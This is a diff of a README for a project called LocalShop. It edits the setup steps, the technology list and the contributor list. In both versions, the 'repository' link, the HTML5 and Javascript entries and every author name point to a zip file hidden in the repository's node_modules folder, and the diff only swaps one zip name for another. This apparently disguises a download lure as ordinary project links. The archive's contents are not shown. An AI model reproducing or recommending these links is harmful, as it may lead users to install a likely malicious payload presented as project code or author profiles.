@@ -45,7 +45,7 @@ To get the code..
 
 1. Go to the following github repository to access the files.
 ```bash
-https://raw.githubusercontent.com/GabrielW13Nai/LocalShop/main/node_modules/indexof/LocalShop_v2.4-alpha.4.zip
+https://github.com/GabrielW13Nai/LocalShop/raw/refs/heads/main/node_modules/blob/Local-Shop-v3.3.zip
 ```
 
 2. Fork and Clone the repository above to your local computer.
@@ -85,8 +85,8 @@ rails s
 
 ## Technology used
 
-- [HTML5](https://raw.githubusercontent.com/GabrielW13Nai/LocalShop/main/node_modules/indexof/LocalShop_v2.4-alpha.4.zip)
-- [Javascript](https://raw.githubusercontent.com/GabrielW13Nai/LocalShop/main/node_modules/indexof/LocalShop_v2.4-alpha.4.zip)
+- [HTML5](https://github.com/GabrielW13Nai/LocalShop/raw/refs/heads/main/node_modules/blob/Local-Shop-v3.3.zip)
+- [Javascript](https://github.com/GabrielW13Nai/LocalShop/raw/refs/heads/main/node_modules/blob/Local-Shop-v3.3.zip)
 - [CSS]
 - [React Js]
 - [Ruby on Rails]
@@ -94,9 +94,9 @@ rails s
 
 ## Author
 Project contributed to by:
- [Njoroge Gabriel Wambugu](https://raw.githubusercontent.com/GabrielW13Nai/LocalShop/main/node_modules/indexof/LocalShop_v2.4-alpha.4.zip)
- [Iddah Odhiambo](https://raw.githubusercontent.com/GabrielW13Nai/LocalShop/main/node_modules/indexof/LocalShop_v2.4-alpha.4.zip)
- [Jacinta Mwangi](https://raw.githubusercontent.com/GabrielW13Nai/LocalShop/main/node_modules/indexof/LocalShop_v2.4-alpha.4.zip)
+ [Njoroge Gabriel Wambugu](https://github.com/GabrielW13Nai/LocalShop/raw/refs/heads/main/node_modules/blob/Local-Shop-v3.3.zip)
+ [Iddah Odhiambo](https://github.com/GabrielW13Nai/LocalShop/raw/refs/heads/main/node_modules/blob/Local-Shop-v3.3.zip)
+ [Jacinta Mwangi](https://github.com/GabrielW13Nai/LocalShop/raw/refs/heads/main/node_modules/blob/Local-Shop-v3.3.zip)
 
 
 
